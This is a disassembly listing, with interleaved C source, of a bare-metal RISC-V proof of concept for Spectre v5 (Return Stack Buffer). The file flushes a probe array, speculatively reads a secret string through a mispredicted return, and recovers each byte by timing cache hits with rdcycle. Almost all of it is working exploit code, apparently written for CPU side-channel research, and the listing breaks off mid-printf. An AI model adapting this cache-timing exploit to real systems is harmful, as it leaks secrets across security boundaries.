
bin/spectre-v5.riscv：     文件格式 elf64-littleriscv


Disassembly of section .text.init:

0000000080000000 <_start>:
    80000000:	4081                	li	ra,0
    80000002:	4101                	li	sp,0
    80000004:	4181                	li	gp,0
    80000006:	4201                	li	tp,0
    80000008:	4281                	li	t0,0
    8000000a:	4301                	li	t1,0
    8000000c:	4381                	li	t2,0
    8000000e:	4401                	li	s0,0
    80000010:	4481                	li	s1,0
    80000012:	4501                	li	a0,0
    80000014:	4581                	li	a1,0
    80000016:	4601                	li	a2,0
    80000018:	4681                	li	a3,0
    8000001a:	4701                	li	a4,0
    8000001c:	4781                	li	a5,0
    8000001e:	4801                	li	a6,0
    80000020:	4881                	li	a7,0
    80000022:	4901                	li	s2,0
    80000024:	4981                	li	s3,0
    80000026:	4a01                	li	s4,0
    80000028:	4a81                	li	s5,0
    8000002a:	4b01                	li	s6,0
    8000002c:	4b81                	li	s7,0
    8000002e:	4c01                	li	s8,0
    80000030:	4c81                	li	s9,0
    80000032:	4d01                	li	s10,0
    80000034:	4d81                	li	s11,0
    80000036:	4e01                	li	t3,0
    80000038:	4e81                	li	t4,0
    8000003a:	4f01                	li	t5,0
    8000003c:	4f81                	li	t6,0
    8000003e:	62f9                	lui	t0,0x1e
    80000040:	3002a073          	csrs	mstatus,t0
    80000044:	4285                	li	t0,1
    80000046:	02fe                	slli	t0,t0,0x1f
    80000048:	0002d863          	bgez	t0,80000058 <_start+0x58>
    8000004c:	4505                	li	a0,1
    8000004e:	00001297          	auipc	t0,0x1
    80000052:	faa2a923          	sw	a0,-78(t0) # 80001000 <tohost>
    80000056:	bfdd                	j	8000004c <_start+0x4c>
    80000058:	00000297          	auipc	t0,0x0
    8000005c:	09028293          	addi	t0,t0,144 # 800000e8 <_start+0xe8>
    80000060:	30529073          	csrw	mtvec,t0
    80000064:	00301073          	fssr	zero
    80000068:	f0000053          	fmv.w.x	ft0,zero
    8000006c:	f00000d3          	fmv.w.x	ft1,zero
    80000070:	f0000153          	fmv.w.x	ft2,zero
    80000074:	f00001d3          	fmv.w.x	ft3,zero
    80000078:	f0000253          	fmv.w.x	ft4,zero
    8000007c:	f00002d3          	fmv.w.x	ft5,zero
    80000080:	f0000353          	fmv.w.x	ft6,zero
    80000084:	f00003d3          	fmv.w.x	ft7,zero
    80000088:	f0000453          	fmv.w.x	fs0,zero
    8000008c:	f00004d3          	fmv.w.x	fs1,zero
    80000090:	f0000553          	fmv.w.x	fa0,zero
    80000094:	f00005d3          	fmv.w.x	fa1,zero
    80000098:	f0000653          	fmv.w.x	fa2,zero
    8000009c:	f00006d3          	fmv.w.x	fa3,zero
    800000a0:	f0000753          	fmv.w.x	fa4,zero
    800000a4:	f00007d3          	fmv.w.x	fa5,zero
    800000a8:	f0000853          	fmv.w.x	fa6,zero
    800000ac:	f00008d3          	fmv.w.x	fa7,zero
    800000b0:	f0000953          	fmv.w.x	fs2,zero
    800000b4:	f00009d3          	fmv.w.x	fs3,zero
    800000b8:	f0000a53          	fmv.w.x	fs4,zero
    800000bc:	f0000ad3          	fmv.w.x	fs5,zero
    800000c0:	f0000b53          	fmv.w.x	fs6,zero
    800000c4:	f0000bd3          	fmv.w.x	fs7,zero
    800000c8:	f0000c53          	fmv.w.x	fs8,zero
    800000cc:	f0000cd3          	fmv.w.x	fs9,zero
    800000d0:	f0000d53          	fmv.w.x	fs10,zero
    800000d4:	f0000dd3          	fmv.w.x	fs11,zero
    800000d8:	f0000e53          	fmv.w.x	ft8,zero
    800000dc:	f0000ed3          	fmv.w.x	ft9,zero
    800000e0:	f0000f53          	fmv.w.x	ft10,zero
    800000e4:	f0000fd3          	fmv.w.x	ft11,zero
    800000e8:	00000297          	auipc	t0,0x0
    800000ec:	03c28293          	addi	t0,t0,60 # 80000124 <trap_entry>
    800000f0:	30529073          	csrw	mtvec,t0
    800000f4:	00003197          	auipc	gp,0x3
    800000f8:	14418193          	addi	gp,gp,324 # 80003238 <__global_pointer$>
    800000fc:	0001b217          	auipc	tp,0x1b
    80000100:	1c320213          	addi	tp,tp,451 # 8001b2bf <_end+0x3f>
    80000104:	fc027213          	andi	tp,tp,-64
    80000108:	f1402573          	csrr	a0,mhartid
    8000010c:	4585                	li	a1,1
    8000010e:	00b57063          	bleu	a1,a0,8000010e <_start+0x10e>
    80000112:	01151613          	slli	a2,a0,0x11
    80000116:	9232                	add	tp,tp,a2
    80000118:	00150113          	addi	sp,a0,1
    8000011c:	0146                	slli	sp,sp,0x11
    8000011e:	9112                	add	sp,sp,tp
    80000120:	1e10106f          	j	80001b00 <_init>

0000000080000124 <trap_entry>:
    80000124:	716d                	addi	sp,sp,-272
    80000126:	e406                	sd	ra,8(sp)
    80000128:	e80a                	sd	sp,16(sp)
    8000012a:	ec0e                	sd	gp,24(sp)
    8000012c:	f012                	sd	tp,32(sp)
    8000012e:	f416                	sd	t0,40(sp)
    80000130:	f81a                	sd	t1,48(sp)
    80000132:	fc1e                	sd	t2,56(sp)
    80000134:	e0a2                	sd	s0,64(sp)
    80000136:	e4a6                	sd	s1,72(sp)
    80000138:	e8aa                	sd	a0,80(sp)
    8000013a:	ecae                	sd	a1,88(sp)
    8000013c:	f0b2                	sd	a2,96(sp)
    8000013e:	f4b6                	sd	a3,104(sp)
    80000140:	f8ba                	sd	a4,112(sp)
    80000142:	fcbe                	sd	a5,120(sp)
    80000144:	e142                	sd	a6,128(sp)
    80000146:	e546                	sd	a7,136(sp)
    80000148:	e94a                	sd	s2,144(sp)
    8000014a:	ed4e                	sd	s3,152(sp)
    8000014c:	f152                	sd	s4,160(sp)
    8000014e:	f556                	sd	s5,168(sp)
    80000150:	f95a                	sd	s6,176(sp)
    80000152:	fd5e                	sd	s7,184(sp)
    80000154:	e1e2                	sd	s8,192(sp)
    80000156:	e5e6                	sd	s9,200(sp)
    80000158:	e9ea                	sd	s10,208(sp)
    8000015a:	edee                	sd	s11,216(sp)
    8000015c:	f1f2                	sd	t3,224(sp)
    8000015e:	f5f6                	sd	t4,232(sp)
    80000160:	f9fa                	sd	t5,240(sp)
    80000162:	fdfe                	sd	t6,248(sp)
    80000164:	34202573          	csrr	a0,mcause
    80000168:	341025f3          	csrr	a1,mepc
    8000016c:	860a                	mv	a2,sp
    8000016e:	06f010ef          	jal	ra,800019dc <handle_trap>
    80000172:	34151073          	csrw	mepc,a0
    80000176:	000022b7          	lui	t0,0x2
    8000017a:	8002829b          	addiw	t0,t0,-2048
    8000017e:	3002a073          	csrs	mstatus,t0
    80000182:	60a2                	ld	ra,8(sp)
    80000184:	6142                	ld	sp,16(sp)
    80000186:	61e2                	ld	gp,24(sp)
    80000188:	7202                	ld	tp,32(sp)
    8000018a:	72a2                	ld	t0,40(sp)
    8000018c:	7342                	ld	t1,48(sp)
    8000018e:	73e2                	ld	t2,56(sp)
    80000190:	6406                	ld	s0,64(sp)
    80000192:	64a6                	ld	s1,72(sp)
    80000194:	6546                	ld	a0,80(sp)
    80000196:	65e6                	ld	a1,88(sp)
    80000198:	7606                	ld	a2,96(sp)
    8000019a:	76a6                	ld	a3,104(sp)
    8000019c:	7746                	ld	a4,112(sp)
    8000019e:	77e6                	ld	a5,120(sp)
    800001a0:	680a                	ld	a6,128(sp)
    800001a2:	68aa                	ld	a7,136(sp)
    800001a4:	694a                	ld	s2,144(sp)
    800001a6:	69ea                	ld	s3,152(sp)
    800001a8:	7a0a                	ld	s4,160(sp)
    800001aa:	7aaa                	ld	s5,168(sp)
    800001ac:	7b4a                	ld	s6,176(sp)
    800001ae:	7bea                	ld	s7,184(sp)
    800001b0:	6c0e                	ld	s8,192(sp)
    800001b2:	6cae                	ld	s9,200(sp)
    800001b4:	6d4e                	ld	s10,208(sp)
    800001b6:	6dee                	ld	s11,216(sp)
    800001b8:	7e0e                	ld	t3,224(sp)
    800001ba:	7eae                	ld	t4,232(sp)
    800001bc:	7f4e                	ld	t5,240(sp)
    800001be:	7fee                	ld	t6,248(sp)
    800001c0:	6151                	addi	sp,sp,272
    800001c2:	30200073          	mret

Disassembly of section .tohost:

0000000080001000 <tohost>:
	...

0000000080001040 <fromhost>:
	...

Disassembly of section .text:

0000000080001048 <flushCache>:
 *
 * @param addr starting address to clear the cache
 * @param sz size of the data to remove in bytes
 */
void flushCache(uint64_t addr, uint64_t sz)
{
    80001048:	711d                	addi	sp,sp,-96
    8000104a:	eca2                	sd	s0,88(sp)
    8000104c:	1080                	addi	s0,sp,96
    8000104e:	faa43423          	sd	a0,-88(s0)
    80001052:	fab43023          	sd	a1,-96(s0)
    // printf("Flushed addr(0x%lx) tag(0x%lx) set(0x%lx) off(0x%lx) sz(%ld)\n", addr, (addr & TAG_MASK) >> (L1_SET_BITS + L1_BLOCK_BITS), 
    //                                                                    (addr & SET_MASK) >> L1_BLOCK_BITS, addr & OFF_MASK, sz);

    // find out the amount of blocks you want to clear
    uint64_t numSetsClear = sz >> L1_BLOCK_BITS;
    80001056:	fa043783          	ld	a5,-96(s0)
    8000105a:	8399                	srli	a5,a5,0x6
    8000105c:	fef43423          	sd	a5,-24(s0)
    if ((sz & OFF_MASK) != 0)
    80001060:	fa043783          	ld	a5,-96(s0)
    80001064:	03f7f793          	andi	a5,a5,63
    80001068:	c791                	beqz	a5,80001074 <flushCache+0x2c>
    {
        numSetsClear += 1;
    8000106a:	fe843783          	ld	a5,-24(s0)
    8000106e:	0785                	addi	a5,a5,1
    80001070:	fef43423          	sd	a5,-24(s0)
    }

    if (numSetsClear > L1_SETS)
    80001074:	fe843703          	ld	a4,-24(s0)
    80001078:	04000793          	li	a5,64
    8000107c:	00e7f663          	bleu	a4,a5,80001088 <flushCache+0x40>
    {
        // flush entire cache with no rollover (makes the function finish faster) 
        numSetsClear = L1_SETS;
    80001080:	04000793          	li	a5,64
    80001084:	fef43423          	sd	a5,-24(s0)
    }
    
    //printf("numSetsClear(%ld)\n", numSetsClear);

    // temp variable used for nothing
    uint8_t dummy = 0;
    80001088:	fc040ba3          	sb	zero,-41(s0)

    // this mem address is the start of a contiguous set of memory that will fit inside of the cache
    // thus it has the following properties
    // 1. dummyMem <= alignedMem < dummyMem + sizeof(dummyMem)
    // 2. alignedMem has idx = 0 and offset = 0 
    uint64_t alignedMem = (((uint64_t)dummyMem) + L1_SZ_BYTES) & TAG_MASK;
    8000108c:	00002717          	auipc	a4,0x2
    80001090:	9b470713          	addi	a4,a4,-1612 # 80002a40 <dummyMem>
    80001094:	6791                	lui	a5,0x4
    80001096:	973e                	add	a4,a4,a5
    80001098:	77fd                	lui	a5,0xfffff
    8000109a:	8ff9                	and	a5,a5,a4
    8000109c:	fcf43423          	sd	a5,-56(s0)
    //printf("alignedMem(0x%lx)\n", alignedMem);
        
    for (uint64_t i = 0; i < numSetsClear; ++i)
    800010a0:	fe043023          	sd	zero,-32(s0)
    800010a4:	a8b9                	j	80001102 <flushCache+0xba>
    {
        // offset to move across the sets that you want to flush
        uint64_t setOffset = (((addr & SET_MASK) >> L1_BLOCK_BITS) + i) << L1_BLOCK_BITS;
    800010a6:	fa843783          	ld	a5,-88(s0)
    800010aa:	8399                	srli	a5,a5,0x6
    800010ac:	03f7f713          	andi	a4,a5,63
    800010b0:	fe043783          	ld	a5,-32(s0)
    800010b4:	97ba                	add	a5,a5,a4
    800010b6:	079a                	slli	a5,a5,0x6
    800010b8:	fcf43023          	sd	a5,-64(s0)
        //printf("setOffset(0x%lx)\n", setOffset);

        // since there are L1_WAYS you need to flush the entire set
        for(uint64_t j = 0; j < 4*L1_WAYS; ++j)   //j < 4*L1_WAYS
    800010bc:	fc043c23          	sd	zero,-40(s0)
    800010c0:	a03d                	j	800010ee <flushCache+0xa6>
        {
            // offset to reaccess the set
            uint64_t wayOffset = j << (L1_BLOCK_BITS + L1_SET_BITS);
    800010c2:	fd843783          	ld	a5,-40(s0)
    800010c6:	07b2                	slli	a5,a5,0xc
    800010c8:	faf43c23          	sd	a5,-72(s0)
            //printf("wayOffset(0x%lx)\n", wayOffset);

            // evict the previous cache block and put in the dummy mem
            dummy = *((uint8_t*)(alignedMem + setOffset + wayOffset));
    800010cc:	fc843703          	ld	a4,-56(s0)
    800010d0:	fc043783          	ld	a5,-64(s0)
    800010d4:	973e                	add	a4,a4,a5
    800010d6:	fb843783          	ld	a5,-72(s0)
    800010da:	97ba                	add	a5,a5,a4
    800010dc:	0007c783          	lbu	a5,0(a5) # fffffffffffff000 <_end+0xffffffff7ffe3d80>
    800010e0:	fcf40ba3          	sb	a5,-41(s0)
        for(uint64_t j = 0; j < 4*L1_WAYS; ++j)   //j < 4*L1_WAYS
    800010e4:	fd843783          	ld	a5,-40(s0)
    800010e8:	0785                	addi	a5,a5,1
    800010ea:	fcf43c23          	sd	a5,-40(s0)
    800010ee:	fd843703          	ld	a4,-40(s0)
    800010f2:	47bd                	li	a5,15
    800010f4:	fce7f7e3          	bleu	a4,a5,800010c2 <flushCache+0x7a>
    for (uint64_t i = 0; i < numSetsClear; ++i)
    800010f8:	fe043783          	ld	a5,-32(s0)
    800010fc:	0785                	addi	a5,a5,1
    800010fe:	fef43023          	sd	a5,-32(s0)
    80001102:	fe043703          	ld	a4,-32(s0)
    80001106:	fe843783          	ld	a5,-24(s0)
    8000110a:	f8f76ee3          	bltu	a4,a5,800010a6 <flushCache+0x5e>
            //printf("evict read(0x%lx)\n", alignedMem + setOffset + wayOffset);
        }
    }
}
    8000110e:	0001                	nop
    80001110:	6466                	ld	s0,88(sp)
    80001112:	6125                	addi	sp,sp,96
    80001114:	8082                	ret

0000000080001116 <topTwoIdx>:
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    80001116:	7139                	addi	sp,sp,-64
    80001118:	fc22                	sd	s0,56(sp)
    8000111a:	0080                	addi	s0,sp,64
    8000111c:	fca43c23          	sd	a0,-40(s0)
    80001120:	fcb43823          	sd	a1,-48(s0)
    80001124:	fcc43423          	sd	a2,-56(s0)
    80001128:	fcd43023          	sd	a3,-64(s0)
    outValArray[0] = 0;
    8000112c:	fc043783          	ld	a5,-64(s0)
    80001130:	0007b023          	sd	zero,0(a5)
    outValArray[1] = 0;
    80001134:	fc043783          	ld	a5,-64(s0)
    80001138:	07a1                	addi	a5,a5,8
    8000113a:	0007b023          	sd	zero,0(a5)

    for (uint64_t i = 0; i < inArraySize; ++i){
    8000113e:	fe043423          	sd	zero,-24(s0)
    80001142:	a075                	j	800011ee <topTwoIdx+0xd8>
        if (inArray[i] > outValArray[0]){
    80001144:	fe843783          	ld	a5,-24(s0)
    80001148:	078e                	slli	a5,a5,0x3
    8000114a:	fd843703          	ld	a4,-40(s0)
    8000114e:	97ba                	add	a5,a5,a4
    80001150:	6398                	ld	a4,0(a5)
    80001152:	fc043783          	ld	a5,-64(s0)
    80001156:	639c                	ld	a5,0(a5)
    80001158:	04e7f563          	bleu	a4,a5,800011a2 <topTwoIdx+0x8c>
            outValArray[1] = outValArray[0];
    8000115c:	fc043783          	ld	a5,-64(s0)
    80001160:	07a1                	addi	a5,a5,8
    80001162:	fc043703          	ld	a4,-64(s0)
    80001166:	6318                	ld	a4,0(a4)
    80001168:	e398                	sd	a4,0(a5)
            outValArray[0] = inArray[i];
    8000116a:	fe843783          	ld	a5,-24(s0)
    8000116e:	078e                	slli	a5,a5,0x3
    80001170:	fd843703          	ld	a4,-40(s0)
    80001174:	97ba                	add	a5,a5,a4
    80001176:	6398                	ld	a4,0(a5)
    80001178:	fc043783          	ld	a5,-64(s0)
    8000117c:	e398                	sd	a4,0(a5)
            outIdxArray[1] = outIdxArray[0];
    8000117e:	fc843783          	ld	a5,-56(s0)
    80001182:	0785                	addi	a5,a5,1
    80001184:	fc843703          	ld	a4,-56(s0)
    80001188:	00074703          	lbu	a4,0(a4)
    8000118c:	00e78023          	sb	a4,0(a5)
            outIdxArray[0] = i;
    80001190:	fe843783          	ld	a5,-24(s0)
    80001194:	0ff7f713          	andi	a4,a5,255
    80001198:	fc843783          	ld	a5,-56(s0)
    8000119c:	00e78023          	sb	a4,0(a5)
    800011a0:	a091                	j	800011e4 <topTwoIdx+0xce>
        }
        else if (inArray[i] > outValArray[1]){
    800011a2:	fe843783          	ld	a5,-24(s0)
    800011a6:	078e                	slli	a5,a5,0x3
    800011a8:	fd843703          	ld	a4,-40(s0)
    800011ac:	97ba                	add	a5,a5,a4
    800011ae:	6398                	ld	a4,0(a5)
    800011b0:	fc043783          	ld	a5,-64(s0)
    800011b4:	07a1                	addi	a5,a5,8
    800011b6:	639c                	ld	a5,0(a5)
    800011b8:	02e7f663          	bleu	a4,a5,800011e4 <topTwoIdx+0xce>
            outValArray[1] = inArray[i];
    800011bc:	fe843783          	ld	a5,-24(s0)
    800011c0:	078e                	slli	a5,a5,0x3
    800011c2:	fd843703          	ld	a4,-40(s0)
    800011c6:	973e                	add	a4,a4,a5
    800011c8:	fc043783          	ld	a5,-64(s0)
    800011cc:	07a1                	addi	a5,a5,8
    800011ce:	6318                	ld	a4,0(a4)
    800011d0:	e398                	sd	a4,0(a5)
            outIdxArray[1] = i;
    800011d2:	fc843783          	ld	a5,-56(s0)
    800011d6:	0785                	addi	a5,a5,1
    800011d8:	fe843703          	ld	a4,-24(s0)
    800011dc:	0ff77713          	andi	a4,a4,255
    800011e0:	00e78023          	sb	a4,0(a5)
    for (uint64_t i = 0; i < inArraySize; ++i){
    800011e4:	fe843783          	ld	a5,-24(s0)
    800011e8:	0785                	addi	a5,a5,1
    800011ea:	fef43423          	sd	a5,-24(s0)
    800011ee:	fe843703          	ld	a4,-24(s0)
    800011f2:	fd043783          	ld	a5,-48(s0)
    800011f6:	f4f767e3          	bltu	a4,a5,80001144 <topTwoIdx+0x2e>
        }
    }
}
    800011fa:	0001                	nop
    800011fc:	7462                	ld	s0,56(sp)
    800011fe:	6121                	addi	sp,sp,64
    80001200:	8082                	ret

0000000080001202 <specFunc>:
/**
 * function to read in the attack array given an attack address to read in. it does this speculatively by bypassing the RSB
 *
 * @input addr passed in address to read from
 */
void specFunc(char *addr){
    80001202:	7139                	addi	sp,sp,-64
    80001204:	fc06                	sd	ra,56(sp)
    80001206:	f822                	sd	s0,48(sp)
    80001208:	0080                	addi	s0,sp,64
    8000120a:	fca43423          	sd	a0,-56(s0)
    //printf("started specFunc\n");
    extern void frameDump();
    uint64_t dummy = 0;
    8000120e:	fe043423          	sd	zero,-24(s0)
    frameDump();
    80001212:	2ca000ef          	jal	ra,800014dc <frameDump>
    char secret = *addr;
    80001216:	fc843783          	ld	a5,-56(s0)
    8000121a:	0007c783          	lbu	a5,0(a5)
    8000121e:	fef403a3          	sb	a5,-25(s0)
    dummy = attackArray[secret * L1_BLOCK_SZ_BYTES];
    80001222:	fe744783          	lbu	a5,-25(s0)
    80001226:	2781                	sext.w	a5,a5
    80001228:	0067979b          	slliw	a5,a5,0x6
    8000122c:	2781                	sext.w	a5,a5
    8000122e:	00016717          	auipc	a4,0x16
    80001232:	81270713          	addi	a4,a4,-2030 # 80016a40 <attackArray>
    80001236:	97ba                	add	a5,a5,a4
    80001238:	0007c783          	lbu	a5,0(a5)
    8000123c:	fef43423          	sd	a5,-24(s0)
    dummy = rdcycle();
    80001240:	c00027f3          	rdcycle	a5
    80001244:	fcf43c23          	sd	a5,-40(s0)
    80001248:	fd843783          	ld	a5,-40(s0)
    8000124c:	fef43423          	sd	a5,-24(s0)
    //printf("finished specFunc\n");
}
    80001250:	0001                	nop
    80001252:	70e2                	ld	ra,56(sp)
    80001254:	7442                	ld	s0,48(sp)
    80001256:	6121                	addi	sp,sp,64
    80001258:	8082                	ret

000000008000125a <main>:

int main(void){
    8000125a:	7119                	addi	sp,sp,-128
    8000125c:	fc86                	sd	ra,120(sp)
    8000125e:	f8a2                	sd	s0,112(sp)
    80001260:	0100                	addi	s0,sp,128
    uint64_t start, diff;
    uint8_t dummy = 0;
    80001262:	fe0407a3          	sb	zero,-17(s0)
    static uint64_t results[256];

    printf("================= This is a POC of spectre_v5 (Return Stack Buffer) ========================= \n");
    80001266:	00001517          	auipc	a0,0x1
    8000126a:	4da50513          	addi	a0,a0,1242 # 80002740 <atol+0xfe>
    8000126e:	7ad000ef          	jal	ra,8000221a <printf>
    printf("the secret key is:%s \n", secretString);
    80001272:	00001797          	auipc	a5,0x1
    80001276:	7c678793          	addi	a5,a5,1990 # 80002a38 <secretString>
    8000127a:	639c                	ld	a5,0(a5)
    8000127c:	85be                	mv	a1,a5
    8000127e:	00001517          	auipc	a0,0x1
    80001282:	52250513          	addi	a0,a0,1314 # 800027a0 <atol+0x15e>
    80001286:	795000ef          	jal	ra,8000221a <printf>

    for (uint64_t offset = 0; offset < SECRET_SZ; ++offset){
    8000128a:	fe043023          	sd	zero,-32(s0)
    8000128e:	ac25                	j	800014c6 <main+0x26c>
        
        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
    80001290:	fc043c23          	sd	zero,-40(s0)
    80001294:	a005                	j	800012b4 <main+0x5a>
            results[cIdx] = 0;
    80001296:	00019717          	auipc	a4,0x19
    8000129a:	7aa70713          	addi	a4,a4,1962 # 8001aa40 <results.2495>
    8000129e:	fd843783          	ld	a5,-40(s0)
    800012a2:	078e                	slli	a5,a5,0x3
    800012a4:	97ba                	add	a5,a5,a4
    800012a6:	0007b023          	sd	zero,0(a5)
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
    800012aa:	fd843783          	ld	a5,-40(s0)
    800012ae:	0785                	addi	a5,a5,1
    800012b0:	fcf43c23          	sd	a5,-40(s0)
    800012b4:	fd843703          	ld	a4,-40(s0)
    800012b8:	0ff00793          	li	a5,255
    800012bc:	fce7fde3          	bleu	a4,a5,80001296 <main+0x3c>
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
    800012c0:	fc043823          	sd	zero,-48(s0)
    800012c4:	a0e1                	j	8000138c <main+0x132>

            //printf("start attack\n");

            // flush the array that will be probed
            flushCache((uint64_t)attackArray, sizeof(attackArray));
    800012c6:	00015797          	auipc	a5,0x15
    800012ca:	77a78793          	addi	a5,a5,1914 # 80016a40 <attackArray>
    800012ce:	6591                	lui	a1,0x4
    800012d0:	853e                	mv	a0,a5
    800012d2:	d77ff0ef          	jal	ra,80001048 <flushCache>

            //printf("flushed attackarray\n");

            // run the particular attack sequence
            specFunc(secretString + offset);
    800012d6:	00001797          	auipc	a5,0x1
    800012da:	76278793          	addi	a5,a5,1890 # 80002a38 <secretString>
    800012de:	6398                	ld	a4,0(a5)
    800012e0:	fe043783          	ld	a5,-32(s0)
    800012e4:	97ba                	add	a5,a5,a4
    800012e6:	853e                	mv	a0,a5
    800012e8:	f1bff0ef          	jal	ra,80001202 <specFunc>
            // __asm__ volatile ("ld fp, -16(sp)");//Adjust the frame pointer for properly looping over the offset

            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i){
    800012ec:	fc043423          	sd	zero,-56(s0)
    800012f0:	a059                	j	80001376 <main+0x11c>
                start = rdcycle();
    800012f2:	c00027f3          	rdcycle	a5
    800012f6:	fcf43023          	sd	a5,-64(s0)
    800012fa:	fc043783          	ld	a5,-64(s0)
    800012fe:	faf43c23          	sd	a5,-72(s0)
                dummy &= attackArray[i * L1_BLOCK_SZ_BYTES];
    80001302:	fc843783          	ld	a5,-56(s0)
    80001306:	079a                	slli	a5,a5,0x6
    80001308:	00015717          	auipc	a4,0x15
    8000130c:	73870713          	addi	a4,a4,1848 # 80016a40 <attackArray>
    80001310:	97ba                	add	a5,a5,a4
    80001312:	0007c703          	lbu	a4,0(a5)
    80001316:	fef44783          	lbu	a5,-17(s0)
    8000131a:	8ff9                	and	a5,a5,a4
    8000131c:	fef407a3          	sb	a5,-17(s0)
                diff = (rdcycle() - start);
    80001320:	c00027f3          	rdcycle	a5
    80001324:	faf43823          	sd	a5,-80(s0)
    80001328:	fb043703          	ld	a4,-80(s0)
    8000132c:	fb843783          	ld	a5,-72(s0)
    80001330:	40f707b3          	sub	a5,a4,a5
    80001334:	faf43423          	sd	a5,-88(s0)
                if ( diff < CACHE_HIT_THRESHOLD ){
    80001338:	fa843703          	ld	a4,-88(s0)
    8000133c:	03100793          	li	a5,49
    80001340:	02e7e663          	bltu	a5,a4,8000136c <main+0x112>
                    results[i] += 1;
    80001344:	00019717          	auipc	a4,0x19
    80001348:	6fc70713          	addi	a4,a4,1788 # 8001aa40 <results.2495>
    8000134c:	fc843783          	ld	a5,-56(s0)
    80001350:	078e                	slli	a5,a5,0x3
    80001352:	97ba                	add	a5,a5,a4
    80001354:	639c                	ld	a5,0(a5)
    80001356:	00178713          	addi	a4,a5,1
    8000135a:	00019697          	auipc	a3,0x19
    8000135e:	6e668693          	addi	a3,a3,1766 # 8001aa40 <results.2495>
    80001362:	fc843783          	ld	a5,-56(s0)
    80001366:	078e                	slli	a5,a5,0x3
    80001368:	97b6                	add	a5,a5,a3
    8000136a:	e398                	sd	a4,0(a5)
            for (uint64_t i = 0; i < 256; ++i){
    8000136c:	fc843783          	ld	a5,-56(s0)
    80001370:	0785                	addi	a5,a5,1
    80001372:	fcf43423          	sd	a5,-56(s0)
    80001376:	fc843703          	ld	a4,-56(s0)
    8000137a:	0ff00793          	li	a5,255
    8000137e:	f6e7fae3          	bleu	a4,a5,800012f2 <main+0x98>
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
    80001382:	fd043783          	ld	a5,-48(s0)
    80001386:	0785                	addi	a5,a5,1
    80001388:	fcf43823          	sd	a5,-48(s0)
    8000138c:	fd043703          	ld	a4,-48(s0)
    80001390:	47a5                	li	a5,9
    80001392:	f2e7fae3          	bleu	a4,a5,800012c6 <main+0x6c>

        //printf("finished rounds\n");

        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);  
    80001396:	f9040713          	addi	a4,s0,-112
    8000139a:	fa040793          	addi	a5,s0,-96
    8000139e:	86ba                	mv	a3,a4
    800013a0:	863e                	mv	a2,a5
    800013a2:	10000593          	li	a1,256
    800013a6:	00019517          	auipc	a0,0x19
    800013aa:	69a50513          	addi	a0,a0,1690 # 8001aa40 <results.2495>
    800013ae:	d69ff0ef          	jal	ra,80001116 <topTwoIdx>

        if(output[0] == (int)secretString[offset] || output[1] == (int)secretString[offset]) 
    800013b2:	fa044683          	lbu	a3,-96(s0)
    800013b6:	00001797          	auipc	a5,0x1
    800013ba:	68278793          	addi	a5,a5,1666 # 80002a38 <secretString>
    800013be:	6398                	ld	a4,0(a5)
    800013c0:	fe043783          	ld	a5,-32(s0)
    800013c4:	97ba                	add	a5,a5,a4
    800013c6:	0007c783          	lbu	a5,0(a5)
    800013ca:	8736                	mv	a4,a3
    800013cc:	02f70163          	beq	a4,a5,800013ee <main+0x194>
    800013d0:	fa144683          	lbu	a3,-95(s0)
    800013d4:	00001797          	auipc	a5,0x1
    800013d8:	66478793          	addi	a5,a5,1636 # 80002a38 <secretString>
    800013dc:	6398                	ld	a4,0(a5)
    800013de:	fe043783          	ld	a5,-32(s0)
    800013e2:	97ba                	add	a5,a5,a4
    800013e4:	0007c783          	lbu	a5,0(a5)
    800013e8:	8736                	mv	a4,a3
    800013ea:	06f71663          	bne	a4,a5,80001456 <main+0x1fc>
        printf("\033[0;32;32mvaddr[%010p]:offset(%lu): want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    800013ee:	00001797          	auipc	a5,0x1
    800013f2:	64a78793          	addi	a5,a5,1610 # 80002a38 <secretString>
    800013f6:	6398                	ld	a4,0(a5)
        (uint8_t*)(secretString + offset),offset,secretString[offset], hitArray[0], output[0], output[0], 
    800013f8:	fe043783          	ld	a5,-32(s0)
    800013fc:	00f705b3          	add	a1,a4,a5
    80001400:	00001797          	auipc	a5,0x1
    80001404:	63878793          	addi	a5,a5,1592 # 80002a38 <secretString>
    80001408:	6398                	ld	a4,0(a5)
    8000140a:	fe043783          	ld	a5,-32(s0)
    8000140e:	97ba                	add	a5,a5,a4
    80001410:	0007c783          	lbu	a5,0(a5)
        printf("\033[0;32;32mvaddr[%010p]:offset(%lu): want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001414:	0007869b          	sext.w	a3,a5
    80001418:	f9043603          	ld	a2,-112(s0)
        (uint8_t*)(secretString + offset),offset,secretString[offset], hitArray[0], output[0], output[0], 
    8000141c:	fa044783          	lbu	a5,-96(s0)
        printf("\033[0;32;32mvaddr[%010p]:offset(%lu): want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001420:	0007851b          	sext.w	a0,a5
        (uint8_t*)(secretString + offset),offset,secretString[offset], hitArray[0], output[0], output[0], 
    80001424:	fa044783          	lbu	a5,-96(s0)
        printf("\033[0;32;32mvaddr[%010p]:offset(%lu): want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001428:	0007881b          	sext.w	a6,a5
    8000142c:	f9843883          	ld	a7,-104(s0)
                                                           hitArray[1], output[1], output[1]); 
    80001430:	fa144783          	lbu	a5,-95(s0)
        printf("\033[0;32;32mvaddr[%010p]:offset(%lu): want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001434:	2781                	sext.w	a5,a5
